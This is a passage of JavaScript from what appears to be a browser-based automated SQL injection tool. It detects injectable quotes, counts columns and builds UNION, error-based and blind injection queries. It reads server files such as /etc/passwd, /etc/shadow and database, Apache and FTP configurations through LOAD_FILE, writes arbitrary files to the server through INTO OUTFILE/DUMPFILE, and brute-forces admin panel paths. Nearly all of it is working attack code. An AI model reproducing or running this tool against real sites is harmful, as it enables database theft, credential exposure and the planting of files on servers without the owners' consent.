	var u= url.val().split(url.val().split("%28").join("(").split("%29").join(")").split('concat((')[1].split(')),')[0]);
	url.val(u[0]+"SQLI"+u[1]);
});
$("#inserterrorbtn").live("click",function(){
	var url = $("#url");
	url.val(url.val() + "+/*!And (SelEcT 1 From(SelEcT Count(*),Concat(SQLI,floor(rAnd(0)*2))x From InforMation_Schema.TaBles Group By x)a)*/-- -");
});
$("#requestmethodbtn").live("click",function(){
	if($(this).html() == "POST Method"){
		$(this).html("GET Method");
		$("#victimurl #body").html("URI: <input type='text' value='"+window.location.href+"' style='width: 80%;' id='url'><textarea style='width: 95%; height: 70px;' id='data'></textarea>");
		VTM.request = "post";
	}else{
		$(this).html("POST Method");
		$("#victimurl #body").html("<textarea style='width: 95%; height: 90px;' id='url'></textarea>");
		VTM.request = "get";
	}
});
$("#getcurrenttbbtn").live("click",function(){
	global();
	if(VTM.type == 'mysql'){
		var qr = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].database+SQL.space+SQL[VTM.bypass].as+SQL.space+"C";
	}else{
	}
	if(VTM.method == 'union'){
		qr = URL[0] + QueryCreater(qr) + URL[1];
		SQLIAjax(qr,AddDB,0,VTM.request);
	}else if(VTM.method == 'error'){
		ErrorGetData(QueryCreater(qr),1,AddDB);
	}else{
		Blinder(qr,
		[
			AddDB,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
});
$("#victimurl #url").live('change',function(){
	QUOTE.false = 0;
	BLD.false = 0;
});
/***********************************************************
Load file
************************************************************/
var FileLoadDic="/etc/passwd,/etc/shadow,/etc/group,/etc/security/group,/etc/security/passwd,/etc/security/user,/etc/security/environ,/etc/security/limits,/usr/lib/security/mkuser.default,/apache/logs/access.log,/apache/logs/error.log,/etc/httpd/logs/acces.log,/etc/httpd/logs/error.log,/var/www/logs/access_log,/usr/local/apache/logs/access_ log,/var/log/apache/access_log,/var/log/apache2/access_log,/var/log/apache/access.log,/var/log/access.log,/var/www/logs/error.log,/usr/local/apache/logs/error_log,/var/log/apache/error_log,/var/log/apache2/error_log,/var/log/error_log,/var/log/httpd/access_log,/var/log/httpd/error_log,/apache2/logs/error.log,/apache2/logs/access.log,/logs/error.log,/logs/access.log,/etc/httpd/logs/acces.log,/etc/httpd/logs/error.log,/usr/local/apache/logs/error_log,/usr/local/apache2/logs/access_log,/var/www/logs/access_log,/var/www/logs/error.log,/var/log/httpd/access_log,/var/log/httpd/error.log,/var/log/apache/access_log,/var/log/apache/error.log,/var/log/apache2/access_log,/var/log/apache2/error.log,/var/log/access_log,/var/log/error.log,/opt/lampp/logs/access_log,/opt/lampp/logs/error_log,/opt/xampp/logs/access_log,/opt/xampp/logs/error_log,/opt/lampp/logs/access.log,/opt/lampp/logs/error.log,\\Program Files\\Apache Group\\Apache\\logs\\access.log,/Program Files\\Apache Group\\Apache\\logs\\error.log,/logs/error.log,/logs/access.log,/var/www/logs/access.log,/usr/local/apache/logs/access_log,/usr/local/apache/logs/access.log,/var/log/apache/access_log,/var/log/apache/access.log,/var/log/access_log,/var/www/logs/error_log,/var/www/logs/error.log,/usr/local/apache/logs/error_log,/var/log/apache/error.log,/var/log/access_log,/var/log/error_log,/usr/local/apache/conf/httpd.conf,/usr/local/apache2/conf/httpd.conf,/etc/httpd/conf/httpd.conf,/etc/apache/conf/httpd.conf,/usr/local/etc/apache/conf/httpd.conf,/etc/apache2/httpd.conf,/usr/local/apache/conf/httpd.conf,/usr/local/apache2/conf/httpd.conf,/usr/local/apache/httpd.conf,/usr/local/apache2/httpd.conf,/usr/local/httpd/conf/httpd.conf,/usr/local/etc/apache/conf/httpd.conf,/usr/local/etc/apache2/conf/httpd.conf,/usr/local/etc/httpd/conf/httpd.conf,/usr/apache2/conf/httpd.conf,/usr/apache/conf/httpd.conf,/etc/apache/conf/httpd.conf,/etc/apache2/conf/httpd.conf,/etc/httpd/conf/httpd.conf,/etc/http/conf/httpd.conf,/etc/apache2/httpd.conf,/etc/httpd/httpd.conf,/etc/http/httpd.conf,/etc/httpd.conf,/opt/apache/conf/httpd.conf,/opt/apache2/conf/httpd.conf,/var/www/conf/httpd.conf,/private/etc/httpd/httpd.conf,/private/etc/httpd/httpd.conf.default,/Volumes/webBackup/opt/apache2/conf/httpd.conf,/Volumes/webBackup/private/etc/httpd/httpd.conf,/Volumes/webBackup/private/etc/httpd/httpd.conf.default,/Program Files\\Apache Group\\Apache\\conf\\httpd.conf,/Program Files\\Apache Group\\Apache2\\conf\\httpd.conf,/Program Files\\xampp\\apache\\conf\\httpd.conf,/usr/local/php/httpd.conf.php,/usr/local/php4/httpd.conf.php,/usr/local/php5/httpd.conf.php,/usr/local/php/httpd.conf,/usr/local/php4/httpd.conf,/usr/local/php5/httpd.conf,/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf,/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf,/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf,/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php,/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php,/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php,/usr/local/etc/apache/vhosts.conf,/etc/php.ini,/bin/php.ini,/etc/httpd/php.ini,/usr/lib/php.ini,/usr/lib/php/php.ini,/usr/local/etc/php.ini,/usr/local/lib/php.ini,/usr/local/php/lib/php.ini,/usr/local/php4/lib/php.ini,/usr/local/php5/lib/php.ini,/usr/local/apache/conf/php.ini,/etc/php4.4/fcgi/php.ini,/etc/php4/apache/php.ini,/etc/php4/apache2/php.ini,/etc/php5/apache/php.ini,/etc/php5/apache2/php.ini,/etc/php/php.ini,/etc/php/php4/php.ini,/etc/php/apache/php.ini,/etc/php/apache2/php.ini,/web/conf/php.ini,/usr/local/Zend/etc/php.ini,/opt/xampp/etc/php.ini,/var/local/www/conf/php.ini,/etc/php/cgi/php.ini,/etc/php4/cgi/php.ini,/etc/php5/cgi/php.ini,/php5\\php.ini,/php4\\php.ini,/php\\php.ini,/PHP\\php.ini,/WINDOWS\\php.ini,/WINNT\\php.ini,/apache\\php\\php.ini,/xampp\\apache\\bin\\php.ini,/NetServer\\bin\\stable\\apache\\php.ini,/home2\\bin\\stable\\apache\\php.ini,/home\\bin\\stable\\apache\\php.ini,/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini,/usr/local/cpanel/logs,/usr/local/cpanel/logs/stats_log,/usr/local/cpanel/logs/access_log,/usr/local/cpanel/logs/error_log,/usr/local/cpanel/logs/license_log,/usr/local/cpanel/logs/login_log,/usr/local/cpanel/logs/stats_log,/var/cpanel/cpanel.config,/var/log/mysql/mysql-bin.log,/var/log/mysql.log,/var/log/mysqlderror.log,/var/log/mysql/mysql.log,/var/log/mysql/mysql-slow.log,/var/mysql.log,/var/lib/mysql/my.cnf,/etc/mysql/my.cnf,/etc/my.cnf,/etc/logrotate.d/proftpd,/www/logs/proftpd.system.log,/var/log/proftpd,/etc/proftp.conf,/etc/protpd/proftpd.conf,/etc/vhcs2/proftpd/proftpd.conf,/etc/proftpd/modules.conf,/var/log/vsftpd.log,/etc/vsftpd.chroot_list,/etc/logrotate.d/vsftpd.log,/etc/vsftpd/vsftpd.conf,/etc/vsftpd.conf,/etc/chrootUsers,/var/log/xferlog,/var/adm/log/xferlog,/etc/wu-ftpd/ftpaccess,/etc/wu-ftpd/ftphosts,/etc/wu-ftpd/ftpusers,/usr/sbin/pure-config.pl,/usr/etc/pure-ftpd.conf,/etc/pure-ftpd/pure-ftpd.conf,/usr/local/etc/pure-ftpd.conf,/usr/local/etc/pureftpd.pdb,/usr/local/pureftpd/etc/pureftpd.pdb,/usr/local/pureftpd/sbin/pure-config.pl,/usr/local/pureftpd/etc/pure-ftpd.conf,-/etc/pure-ftpd.conf,/etc/pure-ftpd/pure-ftpd.pdb,/etc/pureftpd.pdb,/etc/pureftpd.passwd,/etc/pure-ftpd/pureftpd.pdb,/usr/ports/ftp/pure-ftpd/,/usr/ports/net/pure-ftpd/,/usr/pkgsrc/net/pureftpd/,/usr/ports/contrib/pure-ftpd/,/var/log/pure-ftpd/pure-ftpd.log,/logs/pure-ftpd.log,/var/log/pureftpd.log,/var/log/ftp-proxy/ftp-proxy.log,/var/log/ftp-proxy,/var/log/ftplog,/etc/logrotate.d/ftp,/etc/ftpchroot,/etc/ftphosts,/var/log/exim_mainlog,/var/log/exim/mainlog,/var/log/maillog,/var/log/exim_paniclog,/var/log/exim/paniclog,/var/log/exim/rejectlog,/var/log/exim_rejectlog".split(",");
$('#loadfile').html("<div style='width:100%;' id='loadfilemain' class='explore'><div id='head'>Load File</div><div style='height: auto;' id='body'><div id='checklistlfbtn' class='button'>Check List</div><div class='button' id='clcontainerbtn'>0/0</div><textarea id='lfdata' style='width: 98%; height: 250px;'></textarea></div><div id='foot' class='explore' style='width:99%;'><input type='text' id='fnamelf' value='/etc/passwd' style='width: 500px; margin: 6px; float: left;'><div id='checklfbtn' class='button'>Check</div></div><div id='lfcontainer' class='explore' style='width: 100%;'></div></div>");
function AddLFContain(data){
	data = data.responseText.split(SQL.start);
	if(typeof data[1] != "undefined"){
		data = data[1].split(SQL.stop);
		$("#lfcontainer").append("<div><div class='fname active'>"+FileLoadDic[TMP.lfid]+"</div><div class='hidden'>"+data[0].split('\\x0A').join("\n")+"</div></div>");
	}
	TMP.lfid++;
	$("#clcontainerbtn").html((TMP.lfid+1)+"/"+FileLoadDic.length+" --- Scanning : " +FileLoadDic[TMP.lfid]);
	setTimeout(function(){
		if(typeof FileLoadDic[TMP.lfid] != "undefined"){
			MySQLLoadFile(FileLoadDic[TMP.lfid],AddLFContain);
		}
	},VTM.sleep*1000);
}
function AddLF(data){
	data = data.responseText.split(SQL.start);
	if(typeof data[1] == "undefined"){
		$("#lfdata").html("Error!");
	}else{
		data = data[1].split(SQL.stop);
		$("#lfdata").html(data[0].split('\\x0A').join("\n"));
	}
}
function MySQLLoadFile(fname,callback){
	if($("#checklistlfbtn").html() == "Continue") return;
	var lf = SQL[VTM.bypass].concat+"("+t2h(SQL.start)+","+SQL[VTM.bypass].unhex_hex+"("+SQL[VTM.bypass].load_file+"("+ t2h(fname) +"))),"+t2h(SQL.stop)+")";
	
	if(VTM.method == "union"){
		lf = URL[0] + lf + URL[1];
		SQLIAjax(lf,callback,0,VTM.request);
	}else if(VTM.method == "error"){
		ErrorGetData(lf,1,callback);
	}
}
//=====================================
$("#checklfbtn").live("click",function(){
	global();
	MySQLLoadFile($.trim($("#fnamelf").val()),AddLF);
});
$("#checklistlfbtn").live("click",function(){
	global();
	if($(this).html()== "Pause"){
		$(this).html("Continue");
	}else if($(this).html()== "Continue"){
		$(this).html("Pause");
		MySQLLoadFile(FileLoadDic[TMP.lfid],AddLFContain);
	}else{
		TMP.lfid=0;
		$(this).html("Pause");
		$("#clcontainerbtn").html("1/"+FileLoadDic.length+" --- Scanning : " +FileLoadDic[0]);
		$("#lfcontainer").html("");
		MySQLLoadFile(FileLoadDic[0],AddLFContain);
	}
	
	
});

$("#lfcontainer .fname").live("click",function(){
	$("#lfdata").val($(this).next(".hidden").html());
});
/************************************************
Write File
*************************************************/
$("#writefile").html("<div class='explore' id='writefilemain' style='width:100%;'><div id='head'>Write File</div><div id='body' style='height: 300px;'><div class='button' id='wfstatus'>Status</div><textarea style='width: 98%; height: 250px;' id='wfdata'></textarea></div><div style='width:99%;' class='explore' id='foot'><input type='text' style='width: 500px; margin: 6px; float: left;' id='wtpath'><div class='button' id='wfloadbtn'>Write</div></div></div>");
function MySQLWriteFile(file_path,text,count) {
	switch(count)
	{
		case 0:{
			injectionwf=URL[0]+"("+SQL[VTM.bypass].select+SQL.space+t2h(text)+SQL.space+SQL[VTM.bypass].into+SQL.space+SQL[VTM.bypass].dumpfile+SQL.space+"'"+file_path+"')"+URL[1];
			$("#wfstatus").html("dumpfile && simple quotes");
			break;
		}
		case 1:{
			injectionwf=URL[0]+"("+SQL[VTM.bypass].select+SQL.space+t2h(text)+SQL.space+SQL[VTM.bypass].into+SQL.space+SQL[VTM.bypass].dumpfile+SQL.space+"\""+file_path+"\")"+URL[1];
			$("#wfstatus").html("dumpfile && double quotes");
			break;
		}
		case 2:{
			injectionwf=URL[0]+"("+SQL[VTM.bypass].select+SQL.space+t2h(text)+SQL.space+SQL[VTM.bypass].into+SQL.space+SQL[VTM.bypass].outfile+SQL.space+"'"+file_path+"')"+URL[1];
			$("#wfstatus").html("outfile && simple quotes");
			break;
		}
		case 3:{
			injectionwf=URL[0]+"("+SQL[VTM.bypass].select+SQL.space+t2h(text)+SQL.space+SQL[VTM.bypass].into+SQL.space+SQL[VTM.bypass].outfile+SQL.space+"\""+file_path+"\")"+URL[1];
			$("#wfstatus").html("outfile && double quotes");
			break;
		}
		default:{
			$("#wfstatus").html("Finished!");
			return;
		}
	}
	SQLIAjax(injectionwf,
		function(data){
			MySQLWriteFile(file_path,text,count+1);
		},VTM.sleep,VTM.request
	);
}
$("#wfloadbtn").live("click",function(){
	global();
	if($.trim($('#wtpath').val()) !="")
		MySQLWriteFile($.trim($('#wtpath').val()),$.trim($('#wfdata').val()),0);
});

/***************************************************************************
Scan Link Admin
***************************************************************************/
var AdminDirList = "/adm/,/adms/,/admin/,/admin1/,/admincp/,/Admincp/,/admindir/,/administrator/,/administrators/,/administration/,/administrivia/,/administratie/,/adminpanel/,/admins/,/admincontrol/,/adminpro/,/login/,/login1/,/manager/,/manager1/,/trungtam/,/quantri/,/dangnhap/,/quanly/,/quanly1/,/smb/,/smblogin/,/TreeAdmin/,/%23smb/,/%23admin/,/%23admincp/,/%23login/,/%23administrator/,/%23adm/,/admin_area/,/administratoraccounts/,/admin4_account/,/admin4_colon/,/administr8/,/WebAdmin/,/useradmin/,/sysadmin/,/SysAdmin/,/sysadmins/,/webadmin/,/wp-admin/,/fileadmin/,/phpmyadmin/,/myadmin/,/ur-admin/,/Database_Administration/,/siteadmin/,/system-administration/,/pgadmin/,/directadmin/,/staradmin/,/ServerAdministrator/,/LiveUser_Admin/,/sys-admin/,/Server/,/root/,/panel/,/cp/,/CP/,/cppanel/,/cpanel/,/cpanel_file/,/ecp/,/modelsearch/,/moderator/,/controlpanel/,/modelsearch/,/pcad/,/fastcms/,/ql/,/typo3/,/platz_login/,/rcLogin/,/blogindex/,/formslogin/,/autologin/,/support_login/,/meta_login/,/manuallogin/,/simpleLogin/,/loginflat/,/utility_login/,/showlogin/,/memlogin/,/members/,/login-redirect/,/sub-login/,/wp-login/,/dir-login/,/login_db/,/xlogin/,/customer_login/,/UserLogin/,/login-us/,/acct_login/,/bigadmin/,/project-admins/,/phppgadmin/,/pureadmin/,/sql-admin/,/radmind/,/openvpnadmin/,/wizmysqladmin/,/vadmind/,/ezsqliteadmin/,/hpwebjetadmin/,/newsadmin/,/Lotus_Domino_Admin/,/bbadmin/,/vmailadmin/,/Indy_admin/,/ccp14admin/,/irc-macadmin/,/banneradmin/,/sshadmin/,/phpldapadmin/,/macadmin/,/radmind-1/,/Super-Admin/,/AdminTools/,/cmsadmin/,/SysAdmin2/,/globes_admin/,/cadmins/,/phpSQLiteAdmin/,/navSiteAdmin/,/server_admin_small/,/logo_sysadmin/,/server/,/database_administration/,/power_user/,/system_administration/,/ss_vms_admin_sm/,/".split(',');
var AdminFileList = "login,login1,login2,admin,admincp,admin1,admin2,admin2,admins,administrator,admincontrol,adminpanel,controlpanel,manager,dangnhap,quanly,quanly1,fileadmin,webadmin,quanly,administration,sysadmin,useradmin,siteadmin,siteadmin1,administr8,adms,adm,home,root,cp,account,moderator,myadmin,server,ur-admin,fastcms,cms,trungtam,cpanel,ql,yonetim,yonetici".split(',');

$("#adminlink").html("<div style='width:100%;' id='adminscanmain' class='explore'><div id='head'>Admin Link Scaner</div><div style='height: auto;' id='body'><div id='adminscandir' class='explore' style='width: 25%'><div id='head'>Dir</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='dir'></textarea></div></div><div id='adminscanfile' class='explore' style='width: 25%'><div id='head'>File</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='file'></textarea></div></div><div id='adminscanavail' class='explore' style='width: 50%'><div id='head'>Available</div><div style='height: 150px;' id='body'></div></div><div id='adminscanlog' class='explore' style='width: auto; float: none; height: auto;'><div id='head'>Log</div><div style='height: auto;' id='body'><textarea style='height: 435px; width: 95%;' id='log'></textarea></div></div></div><div id='foot' class='explore' style='width:99%;'><div style='margin: 6px; float: left;'>Sub Dir:<input type='text' value='' id='adminscansubdir'></div><div style='margin: 6px; float: left;'>Type:<input type='text' id='adminscanfiletype' value='php'></div><div style='margin: 6px; float: left;'>Sleep:<input type='text' id='adminscansleep' value='0' style='width: 20px;'></div><div style='margin: 6px; float: left;'>Dir only:<input type='checkbox' id='adminscandironly' checked></div><div style='margin: 6px; float: left;'>Advanced Scan:<input type='checkbox' id='adminscanadvanced' ></div><div id='adminscanbtn' class='button'>Scan</div></div></div>");
var SADMIN = {
file: $("#adminscanfile #file"),
dir: $("#adminscandir #dir"),
log: $("#adminscanlog #log"),
avail: $("#adminscanavail #body"),
subdir:"",
dirid: 0,
notfound:0,
dironly : 1,
advanced: 0,
filetype:{},
dircheck: 0,
filecheck: 0,
pause:{}
};
//=============================
function AdminScanGlobal(){
	SADMIN.dirid = 0;
	SADMIN.filetype = $.trim($("#adminscanfiletype").val()).split(",");
	if($("#adminscandironly").is(":checked")){
		SADMIN.dironly = 1;
	}else{
		SADMIN.dironly = 0;
	}
	if($("#adminscanadvanced").is(":checked")){
		SADMIN.advanced = 1;
		SQLIAjax("/CheckingByVinaKid/",
			function(xhr){
				SADMIN.dircheck = xhr.responseText.length;
				SQLIAjax("/CheckingByVinaKid."+SADMIN.filetype[0],
					function(xhr1){
						SADMIN.filecheck = xhr1.responseText.length;
					},VTM.sleep,'get'
				);
			},VTM.sleep,'get'
		);
	}else{
		SADMIN.advanced = 0;
	}
	SADMIN.log.val("");
	SADMIN.avail.val("");
	SADMIN.notfound = 1;
	SADMIN.subdir = $.trim($("#adminscansubdir").val());
	VTM.sleep = parseInt($.trim($("#adminscansleep").val()));
}

function AdminScanShowLog(type,link,status,tmp){ // sua lai cho show available thanh button click
	var t ="";
	if(tmp){
		t = "\t";
	}
	if(type){
		var log = t+"[+]"+status+":   "+link+"\n";
		SADMIN.log.val(SADMIN.log.val()+log);
		SADMIN.avail.append("<div class='adminscanlink active'><a href='"+link+"' target='_blank'>"+log+"</a></div>");
		SADMIN.notfound = 0;
	}else{
		SADMIN.log.val(SADMIN.log.val()+t+"[-]"+status+":   "+link+"\n");
		SADMIN.notfound = 1;
	}
	SADMIN.log.scrollTop(99999);
}
function AdminScanGetStatus(link,callback,count,tmp){
	if($.trim($("#adminscanbtn").html()) == "Continue" || $.trim(link) == ""|| typeof link == "undefined") {
		SADMIN.pause[0] = link;
		SADMIN.pause[1] = callback;
		SADMIN.pause[2] = count;
		SADMIN.pause[3] = tmp;
		return;
	}
	if(SADMIN.advanced){
		SQLIAjax(link,
			function(xhr){
				var check = SADMIN.dircheck;
				if(tmp){
					var check = SADMIN.filecheck;
				}
				if(Math.abs(xhr.responseText.length - check) < VTM.offset){
					AdminScanShowLog(0,link,xhr.status,tmp);
				}else{
					AdminScanShowLog(1,link,xhr.status,tmp);
				}
				callback(count);
			},VTM.sleep,VTM.request
		);
	}else{
		SQLIAjax(link,
			function(xhr){
				if($.trim(xhr.status) == "404"){
					AdminScanShowLog(0,link,xhr.status,tmp);
				}else{
					AdminScanShowLog(1,link,xhr.status,tmp);
				}
				callback(count);
			},VTM.sleep,'head'
		);
	}
}
function AdminScanDir(count){
	if(SADMIN.dironly || SADMIN.notfound){
		if(AdminDirList[count] == "" || typeof AdminDirList[count] == "undefined"){
			return;
		}
		SADMIN.dirid = count+1;
		AdminScanGetStatus(SADMIN.subdir+AdminDirList[count],AdminScanDir,count+1,0); 
	}else{
		AdminScanGetStatus(SADMIN.subdir+AdminDirList[count-1]+AdminFileList[0],AdminScanFile,1,1);
	}
}
function AdminScanFile(count){
	if(AdminFileList[count] == "" || typeof AdminFileList[count] == "undefined"){
		AdminScanDir(SADMIN.dirid+1);
	}else{
		AdminScanGetStatus(SADMIN.subdir+AdminDirList[SADMIN.dirid-1]+AdminFileList[count],AdminScanFile,count+1,1);
	}
}
//============================
for(i=0; i <AdminDirList.length; i++){
	SADMIN.dir.val(SADMIN.dir.val()+ AdminDirList[i] +"\n");
}

for(i=0; i <AdminFileList.length; i++){
	SADMIN.file.val(SADMIN.file.val()+ AdminFileList[i] +"\n");
}
delete AdminDirList;
delete AdminFileList;
/********************************
hook
********************************/
$("#adminscanbtn").live("click",function(){
	AdminFileList = new Array();
	if($(this).html() == 'Pause'){
		$(this).html("Continue");
	}else if($(this).html() == 'Continue'){
		$(this).html("Pause");
		AdminScanGetStatus(SADMIN.pause[0],SADMIN.pause[1],SADMIN.pause[2],SADMIN.pause[3]);
	}else{
		AdminScanGlobal();
		$(this).html("Pause");
		AdminDirList = $.trim(SADMIN.dir.val()).split("\n");
		var fl = $.trim(SADMIN.file.val()).split("\n");
		$.each(SADMIN.filetype,function(){
			for(i=0;i<fl.length;i++)
			{
				AdminFileList.push($.trim(fl[i])+"."+this);
			}
		});
		AdminScanDir(0);
	}
});
/*****************************************************
Quoter
*****************************************************/
var QUOTE = {
false:0,
test:	[
		["",""],
		["'","'"],
		["\"","\""],
		["`","`"],
		[")","("],
		["')","('"],
		["\")","(\""],
		["`)","(`"]
	],
avail:	{
	char:[],
	end:""
	},
end:["--+-","%23"]
};
/************************************************
count: 		vi tri test quote
end:		end char
successfs:	ham goi khi thanh cong
error:		ham goi khi ket thuc ma van chua ra
************************************************/
function Quoter(count,end,bypass,callback){
	if(QUOTE.false){
		CallBacker(callback[0],callback[1]);
		return;
	}
	VTM.bypass= bypass;
	if(typeof QUOTE.end[end] == "undefined" && bypass == "quote"){
		CallBacker(callback[4],callback[5]);
	}else{
		GetQuote(count,end,0,callback);
	}
}
function GetQuote(count,end,type,callback){
	if(typeof QUOTE.test[count] == "undefined"){
		Quoter(0,end+1,"quote",callback);
		return;
	}
	callback[3].push(QUOTE.test[count]);
	CallBacker(callback[2],callback[3]);
	if(type){
		var len1 = URL[0]+QUOTE.test[count][0]+SQL.space+SQL[VTM.bypass].order+SQL.space+SQL[VTM.bypass].by+SQL.space+"1"+QUOTE.end[end]+QUOTE.test[count][1]+URL[1];
		var len2 = URL[0]+QUOTE.test[count][0]+SQL.space+SQL[VTM.bypass].order+SQL.space+SQL[VTM.bypass].by+SQL.space+"99999"+QUOTE.end[end]+QUOTE.test[count][1]+URL[1];
	}else{
		var len1 = URL[0]+QUOTE.test[count][0]+SQL.space+SQL[VTM.bypass].and+SQL.space+"1=1"+QUOTE.end[end]+QUOTE.test[count][1]+URL[1];
		var len2 = URL[0]+QUOTE.test[count][0]+SQL.space+SQL[VTM.bypass].and+SQL.space+"1=0"+QUOTE.end[end]+QUOTE.test[count][1]+URL[1];
	}
	QuoteAJAX(len1,len2,count,end,type,callback);
}
function QuoteAJAX(len1,len2,count,end,type,callback){
	SQLIAjax(len1,
		function(xhr1){
			SQLIAjax(len2,
				function(xhr2){
					if(Math.abs(xhr1.responseText.length - xhr2.responseText.length) > VTM.offset){
						QUOTE.avail.char = QUOTE.test[count];
						QUOTE.avail.end = QUOTE.end[end];
						QUOTE.false = xhr2.responseText.length;
						CallBacker(callback[0],callback[1]);
					}else{
						if(type){
							GetQuote(count+1,end,0,callback);
						}else{
							GetQuote(count,end,1,callback);
						}
					}
				},VTM.sleep,VTM.request
			);
		},VTM.sleep,VTM.request
	);
}

/*****************************************************
ORDER
*****************************************************/
var ORDER = {
len:0,
false:0,
ordercount: 10
};

/*****************************************/

function OrderBy(quote,end,callback){
	var len = URL[0]+quote[0]+SQL.space+SQL[VTM.bypass].order+SQL.space+SQL[VTM.bypass].by+SQL.space+"99999"+end+quote[1]+ URL[1];
	ORDER.ordercount = 10;
	SQLIAjax(len,
		function(xhr){
			ORDER.false = xhr.responseText.length;
			OrderColumnLength(11,quote,end,callback);
		},VTM.sleep,VTM.request
	);
}

function OrderColumnLength(count,quote,end,callback){
	if(count >200){
		CallBacker(callback[4],callback[5]);
		return;
	}
	callback[3].push(count);
	CallBacker(callback[2],callback[3]);
	
	var len = URL[0]+quote[0]+SQL.space+SQL[VTM.bypass].order+SQL.space+SQL[VTM.bypass].by+SQL.space+count+end+quote[1]+ URL[1];
	SQLIAjax(len,
		function(xhr){
			if(Math.abs(xhr.responseText.length - ORDER.false) < VTM.offset){//false
				ORDER.ordercount = Math.floor(ORDER.ordercount/2);
				if(ORDER.ordercount <= 0) ORDER.ordercount =1; else ORDER.ordercount--;
				OrderColumnLength(count - ORDER.ordercount,quote,end,callback);
			}else{//true
				if(ORDER.ordercount < 2){
					ORDER.len = count;
					callback[1].push(count);
					CallBacker(callback[0],callback[1]);
				}else{
					OrderColumnLength(count + ORDER.ordercount,quote,end,callback);
				}
			}
		},VTM.sleep,VTM.request
	);
}

/***********************************************
 * union number available
 **********************************************/
var UNION={
avail:0
};
function Unioner(quote,end,len,callback){
	var num ="";
	for(i=0;i < len;i++){
		num+=SQL[VTM.bypass].concat+"("+t2h(SQL.start)+","+i+",0x7c),";
	}
	var str = URL[0]+"999"+quote[0]+SQL.space+SQL[VTM.bypass].union+SQL.space+SQL[VTM.bypass].select+SQL.space+num.slice(0,-1)+end+quote[1]+URL[1];
	SQLIAjax(str,
		function(xhr){
			var num = xhr.responseText.split(SQL.start);
			if(typeof num[1] == 'undefined'){
				CallBacker(callback[2],callback[3]);
			}else{
				UNION.avail = parseInt(num[1].split("|")[0]);
				var qr ="";
				for(i=0;i < len;i++){
					if(i == UNION.avail){
						qr += SQL[VTM.bypass].concat+"(SQLI),"
					}else{
						qr+=i+",";
					}
				}
				var str = URL[0]+"999"+quote[0]+SQL.space+SQL[VTM.bypass].union+SQL.space+SQL[VTM.bypass].select+SQL.space+qr.slice(0,-1)+end+quote[1]+URL[1];
				callback[1].push(str);
				CallBacker(callback[0],callback[1]);
			}
		},VTM.sleep,VTM.request
	);
}
/*****************************************************
Injector
*****************************************************/
$("#ijtmain #foot").html("<div id='ijtpausebtn' class='button'>Pause</div></div></div>");
/************************************************
Hook inj3ct0r 
************************************************/
var IJT = {
url:[]
};
function IjtLog(log,type){
	var t = "[-] ";
	if(type) t = "[+] "; 
	var jit = $("#ijtdata");
	jit.val(jit.val()+t+log+"\n");
	jit.scrollTop(99999);
}
function IjtClicker(str,method){
	$("#victimurl #url").val(str);
	$("select[name='method'] option:[value='"+method+"']").attr('selected',true);
	SQL.Data = "";	
	$("#selectdbs").click();
}
//==============================
function IjtBlindChecker(data){
	data = $.trim(data.responseText.split(SQL.start)[1].split(SQL.stop)[0]);
	if(data == 'bld'){
		IjtClicker(URL[0]+'SQLI'+URL[1],'blind');
	}else{
		URL[0] = IJT.url[0];
		URL[1] = IJT.url[1];
		URL[2] = IJT.url[2];
		IjtLog("Cann't scan blind SQL",0);
	}
}
//===============================
function IjtErrorBaseChecker(data){
	data = data.responseText.split(SQL.start);
	if(typeof data[1] != 'undefined'){
		IjtLog("Error Base found",1);
		IjtClicker(URL[0]+'SQLI'+URL[1],'error');
	}else{
		URL[0] = IJT.url[0];
		URL[1] = IJT.url[1];
		URL[2] = IJT.url[2];
		IjtLog("Cann't scan Error Base",0);
		IjtLog("Testing Blind SQL",1);
		//blind
		URL[0] = URL[0]+QUOTE.avail.char[0]+SQL.space;
		URL[1] = QUOTE.avail.end+QUOTE.avail.char[1]+URL[1];
		var inject = SQL[VTM.bypass].select+SQL.space+t2h('bld')+SQL.space+SQL[VTM.bypass].as+SQL.space+"C";
		Blinder(inject,
		[
			IjtBlindChecker,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
}
function IjtErrorBase(quote,end){
	IjtLog("Testing Error Base",1);
	IJT.url[0] = URL[0];
	IJT.url[1] = URL[1];
	IJT.url[2] = URL[2];
	URL[0] = URL[0]+QUOTE.avail.char[0]+"+/*!And (SelEcT 1 From(SelEcT Count(*),Concat(";
	URL[1] = ",floor(rAnd(0)*2))x From InforMation_Schema.TaBles Group By x)a)*/"+QUOTE.avail.end+QUOTE.avail.char[1]+URL[1];
	var inject = SQL[VTM.bypass].select+SQL.space+t2h('errorbase')+SQL.space+SQL[VTM.bypass].as+SQL.space+"C";
	ErrorGetData(QueryCreater(inject),1,IjtErrorBaseChecker);	
}
//===============================
$("#loadinjectorbtn").live("click",function(){
	global();
	$("#menu .database").click();
	URL[0] = $.trim(URL[0]);
	IjtLog("Scanning quote...",1);
	Quoter(0,0,"hex",
		[
			function(){
				IjtLog("Get quote is success",1);
				IjtLog("Getting order by count ...",1);
				OrderBy(QUOTE.avail.char,QUOTE.avail.end,
				[
					function(count){
						IjtLog("Get order by is successful : "+count,1);
						Unioner(QUOTE.avail.char,QUOTE.avail.end,ORDER.len,
							[
								function(str){
									IjtLog("Get number is successful : "+UNION.avail,1);
									IjtClicker(str,'union');
								},[],
								function(){
									IjtLog("No number is show",0);
									IjtErrorBase();
								},[]
							]
						);
					},[],
					function(){
						IjtLog("Getting order by count: "+arguments[arguments.length-1],1);
					},[],
					function(){
						IjtLog("No order by number is available",0);
						IjtErrorBase();
					},[]
				]);
			},[],
			function(){
				IjtLog("Testing quote: "+arguments[arguments.length-1][0]+" "+arguments[arguments.length-1][1],1);
			},[],
			function(){
				IjtLog("Cann't get quote",0);
			},[]
		]
	);
});
/************************************************
data dumper 
************************************************/
